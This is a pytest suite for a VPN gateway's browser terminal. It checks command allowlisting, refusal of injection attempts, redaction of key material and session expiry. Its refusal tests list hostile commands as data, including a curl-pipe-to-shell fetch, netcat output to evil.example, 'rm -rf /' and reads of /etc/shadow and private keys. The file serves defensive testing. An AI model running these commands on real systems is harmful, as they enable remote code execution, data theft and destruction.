"""The terminal is the most dangerous feature in the product, so it gets the
most adversarial tests. The claim being defended: a browser cannot reach
arbitrary command execution on a gateway, by any route."""

from __future__ import annotations

from datetime import timedelta

import pytest
from bson import ObjectId

from app.common.timeutil import utcnow
from app.terminal import commands, service


class StubAgent:
    """Stands in for the gateway agent. Records what it was asked to run."""

    calls: list[str] = []

    def __init__(self, server):
        self.server = server

    async def exec_command(self, command_key, timeout_seconds):
        StubAgent.calls.append(command_key)
        return {"output": "interface: wg0\nlistening port: 51820", "exit_code": 0, "duration_ms": 12}


@pytest.fixture()
def agent(monkeypatch):
    StubAgent.calls = []
    monkeypatch.setattr("app.terminal.service.GatewayClient", StubAgent)
    return StubAgent


@pytest.fixture()
async def world(db, agent):
    admin = {"_id": ObjectId(), "email": "ops@example.com", "role": "INFRASTRUCTURE_ADMIN"}
    await db.vpn_servers.insert_one(
        {
            "gateway_id": "sg-sin-01",
            "city": "Singapore",
            "country": "Singapore",
            "agent_url": "http://gateway.internal:8443",
            "agent_secret": "secret",
        }
    )
    return admin


# --- the allowlist ---------------------------------------------------------
def test_allowlisted_commands_resolve_to_a_fixed_argv():
    resolved = commands.resolve("wg show wg0")
    assert resolved.argv == ("wg", "show", "wg0")
    # Whitespace is normalised, not interpreted.
    assert commands.resolve("  wg   show  ").argv == ("wg", "show")


@pytest.mark.parametrize(
    "attempt",
    [
        "sudo su -",
        "bash -i",
        "rm -rf /",
        "cat /etc/wireguard/private.key",
        "curl http://evil.example/x | sh",
        "systemctl stop wg-quick@wg0",
    ],
)
def test_dangerous_commands_are_refused_by_name(attempt):
    with pytest.raises(commands.CommandNotAllowed):
        commands.resolve(attempt)


@pytest.mark.parametrize(
    "attempt",
    [
        "wg show; rm -rf /",
        "wg show && cat /etc/shadow",
        "wg show | nc evil.example 1234",
        "wg show $(whoami)",
        "wg show `id`",
        "wg show > /etc/passwd",
        "wg show\nrm -rf /",
    ],
)
def test_shell_metacharacters_cannot_smuggle_a_second_command(attempt):
    """There is no shell to escape into, and exact matching means these never
    resolve. The test exists so that stays true if matching ever changes."""
    with pytest.raises(commands.CommandNotAllowed):
        commands.resolve(attempt)


def test_no_allowlisted_command_mutates_anything():
    """A read-only guarantee is only as good as the table it rests on."""
    mutating = {"restart", "stop", "start", "set", "del", "add", "flush", "reboot", "rm"}
    for command in commands.SAFE_COMMANDS.values():
        assert not mutating.intersection(command.argv), command.key


# --- execution -------------------------------------------------------------
async def test_an_allowed_command_reaches_the_gateway_and_is_recorded(db, world):
    session = await _session(db, world)
    result = await service.run(session, "wg show wg0")

    assert result["ok"] is True
    assert StubAgent.calls == ["wg show wg0"]
    recorded = await db.terminal_commands.find_one({"command_raw": "wg show wg0"})
    assert recorded["outcome"] == "ran"
    assert recorded["gateway_id"] == "sg-sin-01"


async def test_a_refused_command_never_reaches_the_gateway_but_is_still_recorded(db, world):
    """Refusals are the interesting audit entries: they are what an attempt
    looks like."""
    session = await _session(db, world)
    result = await service.run(session, "sudo rm -rf /")

    assert result["refused"] is True
    assert StubAgent.calls == []
    recorded = await db.terminal_commands.find_one({"outcome": "refused"})
    assert recorded["command_raw"] == "sudo rm -rf /"
    assert recorded["command_resolved"] is None


async def test_command_output_never_leaves_with_key_material_in_it(db, world, monkeypatch):
    async def leaky(self, command_key, timeout_seconds):
        return {
            "output": (
                "interface: wg0\n"
                "  private key: uKm8Yy1Q0bJm2Vd4sC7hR9tT3wX6zA1nP5qE8vB2cD0=\n"
                "  preshared key: aB3dE5fG7hJ9kL1mN3pQ5rS7tU9vW1xY3zA5bC7dE9F=\n"
                "  listening port: 51820\n"
            ),
            "exit_code": 0,
        }

    monkeypatch.setattr(StubAgent, "exec_command", leaky)
    session = await _session(db, world)
    result = await service.run(session, "wg show wg0")

    assert "private key: [redacted]" in result["output"]
    assert "preshared key: [redacted]" in result["output"]
    assert "uKm8Yy" not in result["output"]
    assert "listening port: 51820" in result["output"]


async def test_output_is_capped_so_a_huge_ruleset_cannot_flood_the_browser(db, world, monkeypatch):
    async def enormous(self, command_key, timeout_seconds):
        return {"output": "x" * (service.MAX_OUTPUT_BYTES * 3), "exit_code": 0}

    monkeypatch.setattr(StubAgent, "exec_command", enormous)
    session = await _session(db, world)
    result = await service.run(session, "nft list ruleset")

    assert len(result["output"].encode()) <= service.MAX_OUTPUT_BYTES + 200
    assert "truncated" in result["output"]


async def test_an_unreachable_agent_is_reported_plainly(db, world, monkeypatch):
    async def refuses(self, command_key, timeout_seconds):
        raise ConnectionError("connection refused")

    monkeypatch.setattr(StubAgent, "exec_command", refuses)
    session = await _session(db, world)
    result = await service.run(session, "uptime")

    assert result["ok"] is False
    assert "did not respond" in result["output"]
    assert (await db.terminal_commands.find_one({"outcome": "unreachable"})) is not None


# --- session grants --------------------------------------------------------
async def test_opening_a_session_returns_a_token_and_writes_an_audit_event(db, world):
    opened = await service.open_session(world, "sg-sin-01")
    assert opened["gateway_id"] == "sg-sin-01"
    assert len(opened["token"]) > 20
    assert (await db.audit_events.find_one({"event": "terminal.open"})) is not None

    # The raw token is not stored anywhere.
    stored = await db.terminal_sessions.find_one({})
    assert opened["token"] not in str(stored)


async def test_a_wrong_token_cannot_attach_to_someone_elses_terminal(db, world):
    from app.common.errors import Forbidden

    opened = await service.open_session(world, "sg-sin-01")
    with pytest.raises(Forbidden):
        await service.authenticate(opened["terminal_session_id"], "not-the-token")


async def test_an_expired_grant_is_refused_and_closed(db, world):
    from app.common.errors import Forbidden

    opened = await service.open_session(world, "sg-sin-01")
    await db.terminal_sessions.update_one(
        {"_id": ObjectId(opened["terminal_session_id"])},
        {"$set": {"expires_at": utcnow() - timedelta(seconds=1)}},
    )
    with pytest.raises(Forbidden):
        await service.authenticate(opened["terminal_session_id"], opened["token"])

    closed = await db.terminal_sessions.find_one({"_id": ObjectId(opened["terminal_session_id"])})
    assert closed["close_reason"] == "expired"


async def test_an_idle_grant_times_out(db, world):
    from app.common.errors import Forbidden

    opened = await service.open_session(world, "sg-sin-01")
    await db.terminal_sessions.update_one(
        {"_id": ObjectId(opened["terminal_session_id"])},
        {"$set": {"last_activity_at": utcnow() - timedelta(seconds=service.IDLE_TIMEOUT_SECONDS + 5)}},
    )
    with pytest.raises(Forbidden):
        await service.authenticate(opened["terminal_session_id"], opened["token"])


async def test_a_closed_session_stays_closed(db, world):
    from app.common.errors import Forbidden

    opened = await service.open_session(world, "sg-sin-01")
    await service.close_session(opened["terminal_session_id"], "closed_by_admin")
    with pytest.raises(Forbidden):
        await service.authenticate(opened["terminal_session_id"], opened["token"])


async def _session(db, admin):
    opened = await service.open_session(admin, "sg-sin-01")
    return await service.authenticate(opened["terminal_session_id"], opened["token"])
